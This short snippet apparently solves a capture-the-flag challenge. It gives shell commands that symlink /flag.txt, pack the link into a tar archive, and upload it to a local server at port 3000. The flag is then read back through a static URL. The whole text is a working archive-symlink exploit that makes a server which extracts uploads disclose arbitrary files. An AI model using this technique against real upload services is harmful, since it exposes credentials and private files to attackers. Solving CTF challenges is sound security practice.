ln -s /flag.txt flag.txt
tar cvf test.tar flag.txt
# Upload test.tar in to the server, and access http://localhost:3000/static/<UUID>/flag.txt